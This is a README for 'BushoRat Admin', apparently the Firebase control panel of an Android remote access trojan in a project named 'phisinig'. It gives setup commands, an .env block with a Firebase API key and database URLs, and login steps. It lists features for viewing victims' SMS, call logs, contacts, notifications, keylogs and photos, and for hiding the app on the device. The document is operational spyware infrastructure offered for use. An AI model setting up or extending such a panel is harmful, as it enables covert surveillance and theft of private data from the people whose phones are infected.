# BushoRat Admin (Firebase)

Uses the same Firebase project as the Android app: **phisinig**.

## Setup

```bash
cd admin
npm install
npm run dev
```

Optional `.env` overrides (defaults already match `google-services.json`):

```
VITE_FIREBASE_API_KEY=AIzaSyB2LCkKI3Ah25lKe6cyUFUthp-M9yxg-2Y
VITE_FIREBASE_AUTH_DOMAIN=phisinig.firebaseapp.com
VITE_FIREBASE_DATABASE_URL=https://phisinig-default-rtdb.firebaseio.com
VITE_FIREBASE_PROJECT_ID=phisinig
VITE_FIREBASE_STORAGE_BUCKET=phisinig.appspot.com
```

## Login

1. Open [Firebase Console](https://console.firebase.google.com/project/phisinig/authentication/users)
2. Create an Email/Password user for admin
3. Sign in with that email/password in the admin panel

## Features

- User list from `user_data/` + `users/` + `app_visibility/`
- User detail tabs: profile, SMS, call logs, contacts, notifications, keylogs, gallery
- Hide / Show app via `app_visibility/{userId}/is_hidden`
